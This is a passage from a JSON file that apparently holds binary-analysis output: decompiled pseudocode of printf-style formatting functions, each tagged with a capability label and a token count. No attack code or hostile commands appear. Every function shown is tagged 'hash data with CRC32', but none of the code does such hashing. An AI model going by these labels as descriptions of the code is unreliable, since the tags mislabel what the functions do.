piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1246
    },
    "00444057": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00444057(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043db1f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d861(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e1ed(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dddd(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e762(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e499(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f902(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f614(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac54();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 1;\n        if (iVar2 == 8) {\n            fcn.0044696f(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.00445475(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != 0x30)))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1046
    },
    "004441f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004441f7(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x004442d8;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x004442d8;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x004442d8:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.00446a05(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.004454ff(arg_8h_00, arg_8h);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1246
    },
    "0044d575": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.0044d575(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_10h;\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    uchar uVar7;\n    int32_t in_ECX;\n    uint16_t *puVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint uVar11;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar9 = 0;\n    cVar6 = *(in_ECX + 0x2d);\n    if (cVar6 < 'e') {\n        if (cVar6 == 'd') {\ncode_r0x0044d62d:\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) | 0x10;\ncode_r0x0044d631:\n            cVar6 = fcn.00441da1(0);\n        }\n        else if (cVar6 < 'T') {\n            if (cVar6 == 'S') {\ncode_r0x0044d65a:\n                cVar6 = fcn.00452e2c();\n            }\n            else {\n                if (cVar6 != 'A') {\n                    if (cVar6 == 'C') {\ncode_r0x0044d5e7:\n                        cVar6 = fcn.00451c54(0);\n                        goto code_r0x0044d66a;\n                    }\n                    if (((cVar6 != 'E') && (cVar6 != 'F')) && (cVar6 != 'G')) goto code_r0x0044d8a9;\n                }\ncode_r0x0044d5c5:\n                cVar6 = fcn.00450830();\n            }\n        }\n        else if (cVar6 == 'X') {\n            uVar11 = 1;\ncode_r0x0044d5fc:\n            cVar6 = fcn.00443095(uVar11);\n        }\n        else {\n            if (cVar6 != 'Z') {\n                if (cVar6 != 'a') {\n                    if (cVar6 != 'c') goto code_r0x0044d8a9;\n                    goto code_r0x0044d5e7;\n                }\n                goto code_r0x0044d5c5;\n            }\n            cVar6 = fcn.00450330();\n        }\n    }\n    else if (cVar6 < 'p') {\n        if (cVar6 == 'o') {\n            cVar6 = fcn.00452bc8();\n        }\n        else {\n            if (((cVar6 == 'e') || (cVar6 == 'f')) || (cVar6 == 'g')) goto code_r0x0044d5c5;\n            if (cVar6 == 'i') goto code_r0x0044d62d;\n            if (cVar6 != 'n') goto code_r0x0044d8a9;\n            cVar6 = fcn.004524ec();\n        }\n    }\n    else {\n        if (cVar6 != 'p') {\n            if (cVar6 == 's') goto code_r0x0044d65a;\n            if (cVar6 != 'u') {\n                if (cVar6 != 'x') goto code_r0x0044d8a9;\n                uVar11 = 0;\n                goto code_r0x0044d5fc;\n            }\n            goto code_r0x0044d631;\n        }\n        cVar6 = fcn.00452d24();\n    }\ncode_r0x0044d66a:\n    if ((cVar6 == '\\0') || (*(in_ECX + 0x2c) != '\\0')) goto code_r0x0044d8a9;\n    uVar2 = *(in_ECX + 0x1c);\n    var_ch = (var_ch >> 0x10 & 0xff00) << 0x10;\n    iVar10 = 0;\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        var_ch._1_3_ = var_ch >> 8;\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = CONCAT31(var_ch._1_3_, 0x20);\n                    iVar10 = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0044d6c9;\n            }\n            var_ch = CONCAT31(var_ch._1_3_, 0x2b);\n        }\n        else {\n            var_ch = CONCAT31(var_ch._1_3_, 0x2d);\n        }\n        var_10h = 1;\n        iVar10 = 1;\n    }\ncode_r0x0044d6c9:\n    cVar6 = *(in_ECX + 0x2d);\n    if (((cVar6 != 'x') && (cVar6 != 'X')) || (bVar4 = true,  (uVar2 >> 5 & 1) == 0)) {\n        bVar4 = false;\n    }\n    if ((cVar6 == 'a') || (bVar5 = false,  cVar6 == 'A')) {\n        bVar5 = true;\n    }\n    if ((bVar4) || (bVar5)) {\n        *(&fcn.0044d575::var_ch + iVar10) = 0x30;\n        if ((cVar6 == 'X') || (cVar6 == 'A')) {\n            uVar7 = 0x58;\n        }\n        else {\n            uVar7 = 0x78;\n        }\n        *(&fcn.0044d575::var_ch + iVar10 + 1) = uVar7;\n        iVar10 = iVar10 + 2;\n        var_10h = iVar10;\n    }\n    iVar10 = (*(in_ECX + 0x20) - iVar10) - *(in_ECX + 0x34);\n    if (((uVar2 & 0xc) == 0) && (uVar2 = *(in_ECX + 8),  0 < iVar10)) {\n        while( true ) {\n            var_10h = 0x20;\n            var_ch = uVar2;\n            cVar6 = fcn.00454f59(0x20, uVar2);\n            if (cVar6 == '\\0') break;\n            iVar3 = *(in_ECX + 0x14);\n            *(in_ECX + 0x14) = iVar3 + 1;\n            if ((iVar3 == -2) || (iVar10 < 0x44d74b)) goto code_r0x0044d775;\n        }\n        *(in_ECX + 0x14) = 0xffffffff;\n    }\ncode_r0x0044d775:\n    iVar10 = var_10h;\n    arg_10h = in_ECX + 0x14;\n    var_1ch = var_10h;\n    unaff_EBX = 0x44d793;\n    fcn.00455870(&fcn.0044d575::var_ch, var_10h, arg_10h, *(in_ECX + 8));\n    if (((*(in_ECX + 0x1c) >> 3 & 1) != 0) && ((*(in_ECX + 0x1c) >> 2 & 1) == 0)) {\n        iVar3 = *(in_ECX + 8);\n        var_14h = 0;\n        if (0 < iVar10) {\n            while( true ) {\n                unaff_EBX = 0x44d7c3;\n                cVar6 = fcn.00454f59(0x30, iVar3);\n                var_1ch = iVar3;\n                if (cVar6 == '\\0') break;\n                iVar10 = *arg_10h;\n                *arg_10h = iVar10 + 1;\n                if ((iVar10 == -2) || (var_14h = var_14h + 1,  iVar3 <= var_14h)) goto code_r0x0044d7e7;\n            }\n            *arg_10h = -1;\n        }\n    }\ncode_r0x0044d7e7:\n    if ((*(in_ECX + 0x38) == '\\0') || (*(in_ECX + 0x34) < 1)) {\n        unaff_EBX = *(in_ECX + 8);\n        fcn.00455870(*(in_ECX + 0x30), *(in_ECX + 0x34), arg_10h, unaff_EBX);\n    }\n    else {\n        puVar8 = *(in_ECX + 0x30);\n        var_14h = 0;\n        do {\n            uVar1 = *puVar8;\n            puVar8 = puVar8 + 1;\n            var_10h = 0;\n            iVar10 = fcn.0045eb63(&fcn.0044d575::var_10h, &fcn.0044d575::var_ch, 6, uVar1, *(in_ECX + 8));\n            if ((iVar10 != 0) || (var_10h == 0)) {\n                *arg_10h = -1;\n                break;\n            }\n            fcn.00455870(&fcn.0044d575::var_ch, var_10h, arg_10h, *(in_ECX + 8));\n            var_14h = var_14h + 1;\n        } while (var_14h != *(in_ECX + 0x34));\n    }\n    if (((-1 < *arg_10h) && ((*(in_ECX + 0x1c) >> 2 & 1) != 0)) && (uVar11 = *(in_ECX + 8),  0 < var_1ch)) {\n        while (cVar6 = fcn.00454f59(0x20, uVar11),  cVar6 != '\\0') {\n            iVar10 = *arg_10h;\n            *arg_10h = iVar10 + 1;\n            if ((iVar10 == -2) || (iVar9 = iVar9 + 1,  var_1ch <= iVar9)) goto code_r0x0044d8a9;\n        }\n        *arg_10h = -1;\n    }\ncode_r0x0044d8a9:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2629
    },
    "0044d8b7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.0044d8b7(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_10h;\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    uchar uVar7;\n    int32_t in_ECX;\n    uint16_t *puVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint uVar11;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar9 = 0;\n    cVar6 = *(in_ECX + 0x2d);\n    if (cVar6 < 'e') {\n        if (cVar6 == 'd') {\ncode_r0x0044d96f:\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) | 0x10;\ncode_r0x0044d973:\n            cVar6 = fcn.00441f2e(0);\n        }\n        else if (cVar6 < 'T') {\n            if (cVar6 == 'S') {\ncode_r0x0044d99c:\n                cVar6 = fcn.00452e9e();\n            }\n            else {\n                if (cVar6 != 'A') {\n                    if (cVar6 == 'C') {\ncode_r0x0044d929:\n                        cVar6 = fcn.00451ce9(0);\n                        goto code_r0x0044d9ac;\n                    }\n                    if (((cVar6 != 'E') && (cVar6 != 'F')) && (cVar6 != 'G')) goto code_r0x0044dbfa;\n                }\ncode_r0x0044d907:\n                cVar6 = fcn.004509c1();\n            }\n        }\n        else if (cVar6 == 'X') {\n            uVar11 = 1;\ncode_r0x0044d93e:\n            cVar6 = fcn.00443222(uVar11);\n        }\n        else {\n            if (cVar6 != 'Z') {\n                if (cVar6 != 'a') {\n                    if (cVar6 != 'c') goto code_r0x0044dbfa;\n                    goto code_r0x0044d929;\n                }\n                goto code_r0x0044d907;\n            }\n            cVar6 = fcn.00450393();\n        }\n    }\n    else if (cVar6 < 'p') {\n        if (cVar6 == 'o') {\n            cVar6 = fcn.00452be5();\n        }\n        else {\n            if (((cVar6 == 'e') || (cVar6 == 'f')) || (cVar6 == 'g')) goto code_r0x0044d907;\n            if (cVar6 == 'i') goto code_r0x0044d96f;\n            if (cVar6 != 'n') goto code_r0x0044dbfa;\n            cVar6 = fcn.00452571();\n        }\n    }\n    else {\n        if (cVar6 != 'p') {\n            if (cVar6 == 's') goto code_r0x0044d99c;\n            if (cVar6 != 'u') {\n                if (cVar6 != 'x') goto code_r0x0044dbfa;\n                uVar11 = 0;\n                goto code_r0x0044d93e;\n            }\n            goto code_r0x0044d973;\n        }\n        cVar6 = fcn.00452d3a();\n    }\ncode_r0x0044d9ac:\n    if (((cVar6 == '\\0') || (cVar6 = fcn.0044ad2a(),  cVar6 != '\\0')) || (*(in_ECX + 0x2c) != '\\0'))\n    goto code_r0x0044dbfa;\n    uVar2 = *(in_ECX + 0x1c);\n    var_ch = (var_ch >> 0x10 & 0xff00) << 0x10;\n    iVar10 = 0;\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        var_ch._1_3_ = var_ch >> 8;\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = CONCAT31(var_ch._1_3_, 0x20);\n                    iVar10 = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0044da1a;\n            }\n            var_ch = CONCAT31(var_ch._1_3_, 0x2b);\n        }\n        else {\n            var_ch = CONCAT31(var_ch._1_3_, 0x2d);\n        }\n        var_10h = 1;\n        iVar10 = 1;\n    }\ncode_r0x0044da1a:\n    cVar6 = *(in_ECX + 0x2d);\n    if (((cVar6 != 'x') && (cVar6 != 'X')) || (bVar4 = true,  (uVar2 >> 5 & 1) == 0)) {\n        bVar4 = false;\n    }\n    if ((cVar6 == 'a') || (bVar5 = false,  cVar6 == 'A')) {\n        bVar5 = true;\n    }\n    if ((bVar4) || (bVar5)) {\n        *(&fcn.0044d8b7::var_ch + iVar10) = 0x30;\n        if ((cVar6 == 'X') || (cVar6 == 'A')) {\n            uVar7 = 0x58;\n        }\n        else {\n            uVar7 = 0x78;\n        }\n        *(&fcn.0044d8b7::var_ch + iVar10 + 1) = uVar7;\n        iVar10 = iVar10 + 2;\n        var_10h = iVar10;\n    }\n    iVar10 = (*(in_ECX + 0x20) - iVar10) - *(in_ECX + 0x34);\n    if (((uVar2 & 0xc) == 0) && (uVar2 = *(in_ECX + 8),  0 < iVar10)) {\n        while( true ) {\n            var_10h = 0x20;\n            var_ch = uVar2;\n            cVar6 = fcn.00454f59(0x20, uVar2);\n            if (cVar6 == '\\0') break;\n            iVar3 = *(in_ECX + 0x14);\n            *(in_ECX + 0x14) = iVar3 + 1;\n            if ((iVar3 == -2) || (iVar10 < 0x44da9c)) goto code_r0x0044dac6;\n        }\n        *(in_ECX + 0x14) = 0xffffffff;\n    }\ncode_r0x0044dac6:\n    iVar10 = var_10h;\n    arg_10h = in_ECX + 0x14;\n    var_1ch = var_10h;\n    unaff_EBX = 0x44dae4;\n    fcn.00455870(&fcn.0044d8b7::var_ch, var_10h, arg_10h, *(in_ECX + 8));\n    if (((*(in_ECX + 0x1c) >> 3 & 1) != 0) && ((*(in_ECX + 0x1c) >> 2 & 1) == 0)) {\n        iVar3 = *(in_ECX + 8);\n        var_14h = 0;\n        if (0 < iVar10) {\n            while( true ) {\n                unaff_EBX = 0x44db14;\n                cVar6 = fcn.00454f59(0x30, iVar3);\n                var_1ch = iVar3;\n                if (cVar6 == '\\0') break;\n                iVar10 = *arg_10h;\n                *arg_10h = iVar10 + 1;\n                if ((iVar10 == -2) || (var_14h = var_14h + 1,  iVar3 <= var_14h)) goto code_r0x0044db38;\n            }\n            *arg_10h = -1;\n        }\n    }\ncode_r0x0044db38:\n    if ((*(in_ECX + 0x38) == '\\0') || (*(in_ECX + 0x34) < 1)) {\n        unaff_EBX = *(in_ECX + 8);\n        fcn.00455870(*(in_ECX + 0x30), *(in_ECX + 0x34), arg_10h, unaff_EBX);\n    }\n    else {\n        puVar8 = *(in_ECX + 0x30);\n        var_14h = 0;\n        do {\n            uVar1 = *puVar8;\n            puVar8 = puVar8 + 1;\n            var_10h = 0;\n            iVar10 = fcn.0045eb63(&fcn.0044d8b7::var_10h, &fcn.0044d8b7::var_ch, 6, uVar1, *(in_ECX + 8));\n            if ((iVar10 != 0) || (var_10h == 0)) {\n                *arg_10h = -1;\n                break;\n            }\n            fcn.00455870(&fcn.0044d8b7::var_ch, var_10h, arg_10h, *(in_ECX + 8));\n            var_14h = var_14h + 1;\n        } while (var_14h != *(in_ECX + 0x34));\n    }\n    if (((-1 < *arg_10h) && ((*(in_ECX + 0x1c) >> 2 & 1) != 0)) && (uVar11 = *(in_ECX + 8),  0 < var_1ch)) {\n        while (cVar6 = fcn.00454f59(0x20, uVar11),  cVar6 != '\\0') {\n            iVar10 = *arg_10h;\n            *arg_10h = iVar10 + 1;\n            if ((iVar10 == -2) || (iVar9 = iVar9 + 1,  var_1ch <= iVar9)) goto code_r0x0044dbfa;\n        }\n        *arg_10h = -1;\n    }\ncode_r0x0044dbfa:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2638
    },
    "0044dc08": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.0044dc08(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_10h;\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    uchar uVar7;\n    int32_t in_ECX;\n    uint16_t *puVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint uVar11;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar9 = 0;\n    cVar6 = *(in_ECX + 0x2d);\n    if (cVar6 < 'e') {\n        if (cVar6 == 'd') {\ncode_r0x0044dcc0:\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) | 0x10;\ncode_r0x0044dcc4:\n            cVar6 = fcn.004420ca(0);\n        }\n        else if (cVar6 < 'T') {\n            if (cVar6 == 'S') {\ncode_r0x0044dced:\n                cVar6 = fcn.00452f1c();\n            }\n            else {\n                if (cVar6 != 'A') {\n                    if (cVar6 == 'C') {\ncode_r0x0044dc7a:\n                        cVar6 = fcn.00451da8(0);\n                        goto code_r0x0044dcfd;\n                    }\n                    if (((cVar6 != 'E') && (cVar6 != 'F')) && (cVar6 != 'G')) goto code_r0x0044df3c;\n                }\ncode_r0x0044dc58:\n                cVar6 = fcn.00450b6f();\n            }\n        }\n        else if (cVar6 == 'X') {\n            uVar11 = 1;\ncode_r0x0044dc8f:\n            cVar6 = fcn.004433be(uVar11);\n        }\n        else {\n            if (cVar6 != 'Z') {\n                if (cVar6 != 'a') {\n                    if (cVar6 != 'c') goto code_r0x0044df3c;\n                    goto code_r0x0044dc7a;\n                }\n                goto code_r0x0044dc58;\n            }\n            cVar6 = fcn.0045040d();\n        }\n    }\n    else if (cVar6 < 'p') {\n        if (cVar6 == 'o') {\n            cVar6 = fcn.00452c02();\n        }\n        else {\n            if (((cVar6 == 'e') || (cVar6 == 'f')) || (cVar6 == 'g')) goto code_r0x0044dc58;\n            if (cVar6 == 'i') goto code_r0x0044dcc0;\n            if (cVar6 != 'n') goto code_r0x0044df3c;\n            cVar6 = fcn.0045261e();\n        }\n    }\n    else {\n        if (cVar6 != 'p') {\n            if (cVar6 == 's') goto code_r0x0044dced;\n            if (cVar6 != 'u') {\n                if (cVar6 != 'x') goto code_r0x0044df3c;\n                uVar11 = 0;\n                goto code_r0x0044dc8f;\n            }\n            goto code_r0x0044dcc4;\n        }\n        cVar6 = fcn.00452d50();\n    }\ncode_r0x0044dcfd:\n    if ((cVar6 == '\\0') || (*(in_ECX + 0x2c) != '\\0')) goto code_r0x0044df3c;\n    uVar2 = *(in_ECX + 0x1c);\n    var_ch = (var_ch >> 0x10 & 0xff00) << 0x10;\n    iVar10 = 0;\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        var_ch._1_3_ = var_ch >> 8;\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = CONCAT31(var_ch._1_3_, 0x20);\n                    iVar10 = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0044dd5c;\n            }\n            var_ch = CONCAT31(var_ch._1_3_, 0x2b);\n        }\n        else {\n            var_ch = CONCAT31(var_ch._1_3_, 0x2d);\n        }\n        var_10h = 1;\n        iVar10 = 1;\n    }\ncode_r0x0044dd5c:\n    cVar6 = *(in_ECX + 0x2d);\n    if (((cVar6 != 'x') && (cVar6 != 'X')) || (bVar4 = true,  (uVar2 >> 5 & 1) == 0)) {\n        bVar4 = false;\n    }\n    if ((cVar6 == 'a') || (bVar5 = false,  cVar6 == 'A')) {\n        bVar5 = true;\n    }\n    if ((bVar4) || (bVar5)) {\n        *(&fcn.0044dc08::var_ch + iVar10) = 0x30;\n        if ((cVar6 == 'X') || (cVar6 == 'A')) {\n            uVar7 = 0x58;\n        }\n        else {\n            uVar7 = 0x78;\n        }\n        *(&fcn.0044dc08::var_ch + iVar10 + 1) = uVar7;\n        iVar10 = iVar10 + 2;\n        var_10h = iVar10;\n    }\n    iVar10 = (*(in_ECX + 0x20) - iVar10) - *(in_ECX + 0x34);\n    if (((uVar2 & 0xc) == 0) && (uVar2 = *(in_ECX + 8),  0 < iVar10)) {\n        while( true ) {\n            var_10h = 0x20;\n            var_ch = uVar2;\n            cVar6 = fcn.00454f59(0x20, uVar2);\n            if (cVar6 == '\\0') break;\n            iVar3 = *(in_ECX + 0x14);\n            *(in_ECX + 0x14) = iVar3 + 1;\n            if ((iVar3 == -2) || (iVar10 < 0x44ddde)) goto code_r0x0044de08;\n        }\n        *(in_ECX + 0x14) = 0xffffffff;\n    }\ncode_r0x0044de08:\n    iVar10 = var_10h;\n    arg_10h = in_ECX + 0x14;\n    var_1ch = var_10h;\n    unaff_EBX = 0x44de26;\n    fcn.00455870(&fcn.0044dc08::var_ch, var_10h, arg_10h, *(in_ECX + 8));\n    if (((*(in_ECX + 0x1c) >> 3 & 1) != 0) && ((*(in_ECX + 0x1c) >> 2 & 1) == 0)) {\n        iVar3 = *(in_ECX + 8);\n        var_14h = 0;\n        if (0 < iVar10) {\n            while( true ) {\n                unaff_EBX = 0x44de56;\n                cVar6 = fcn.00454f59(0x30, iVar3);\n                var_1ch = iVar3;\n                if (cVar6 == '\\0') break;\n                iVar10 = *arg_10h;\n                *arg_10h = iVar10 + 1;\n                if ((iVar10 == -2) || (var_14h = var_14h + 1,  iVar3 <= var_14h)) goto code_r0x0044de7a;\n            }\n            *arg_10h = -1;\n        }\n    }\ncode_r0x0044de7a:\n    if ((*(in_ECX + 0x38) == '\\0') || (*(in_ECX + 0x34) < 1)) {\n        unaff_EBX = *(in_ECX + 8);\n        fcn.00455870(*(in_ECX + 0x30), *(in_ECX + 0x34), arg_10h, unaff_EBX);\n    }\n    else {\n        puVar8 = *(in_ECX + 0x30);\n        var_14h = 0;\n        do {\n            uVar1 = *puVar8;\n            puVar8 = puVar8 + 1;\n            var_10h = 0;\n            iVar10 = fcn.0045eb63(&fcn.0044dc08::var_10h, &fcn.0044dc08::var_ch, 6, uVar1, 